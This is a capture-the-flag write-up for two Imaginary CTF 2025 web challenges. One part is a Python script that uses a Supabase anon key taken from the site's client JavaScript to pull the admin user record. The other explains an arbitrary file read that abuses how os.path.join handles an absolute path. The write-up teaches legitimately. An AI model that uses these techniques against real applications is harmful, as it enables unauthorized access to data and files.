-----------

### Imaginary CTF 2025

-----------

![image](https://github.com/user-attachments/assets/a6341580-8aea-42ec-8676-11eda1a5dcc2)

-------------

### Challenges 

-------------

- Web-:
  - Imaginary notes
  - Codenames 1

---------------

### Imaginary-notes

----------------

![image](https://github.com/user-attachments/assets/5a5b57d5-e346-4a49-8be8-9b1b2e1e779b)

-----------------

- We have a Nextjs application.I checked the `view-source` for minified js files and discovered one.

![image](https://github.com/user-attachments/assets/463cf46a-cc68-4ab5-9789-175a7e7c9fd9)

- I visited the page and discovered a minified code with a supabase url and an api key.

![image](https://github.com/user-attachments/assets/6473f555-28f2-4b85-880c-e01c1326433c)

- Solve.py-:

```python3
#! /usr/bin/env python3
from  supabase import Client,create_client

url = "https://dpyxnwiuwzahkxuxrojp.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI"

client =  create_client(url,key)
data = client.table("users").select("*").eq("username","admin").execute()
print(data)
```

- Flag-: ```ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}```

![image](https://github.com/user-attachments/assets/795fd795-7725-4272-9ca8-cdf1c4d4b376)

--------------------

### Codenames 1

--------------------

![image](https://github.com/user-attachments/assets/f620acb4-0cec-405e-84e3-68bc09581ecb)

--------------------

- The main sink is in route `/create_game` and in body query `language`.

```python3
@app.route('/create_game', methods=['POST'])
def create_game():
    if 'username' not in session:
        return redirect(url_for('index'))
    # generate unique code
    while True:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        if code not in games:
            break
    # prepare game with selected language word list
    # determine language (default to first available)
    language = request.form.get('language', None)
    if not language or '.' in language:
        language = LANGUAGES[0] if LANGUAGES else None
    # load words for this language
    word_list = []
    if language:
        wl_path = os.path.join(WORDS_DIR, f"{language}.txt")
        try:
            with open(wl_path) as wf:
                word_list = [line.strip() for line in wf if line.strip()]
        except IOError as e:
            print(e)
            word_list = []
    # fallback if needed
    if not word_list:
        word_list = []
```
- The variable gets passed to the second argumnet in `os.path.join()` which an attacker can control to file read in such a way that abuses `os.path.join()`'s quirk. If the first argument is a relative path and the second path is an absolute one.The function picks the second one which is an absolute and nullifies the first argument. e.g

![image](https://github.com/user-attachments/assets/e5bfe061-b0fb-40b1-8228-a5f48e3df356)

- Exploiting it-:

![image](https://github.com/user-attachments/assets/7d288798-3711-4744-8039-e2a3f537c82b)


- Flag-: ```ictf{common_os_path_join_L_b19d35ca}```

![image](https://github.com/user-attachments/assets/a1591cc9-f887-41f3-ae8e-468b2a9e6073)

----------------

### Certificate

----------------

![image](https://github.com/user-attachments/assets/db68475e-987a-4c8a-835e-98a3952cac32)

----------------

- 

----------------



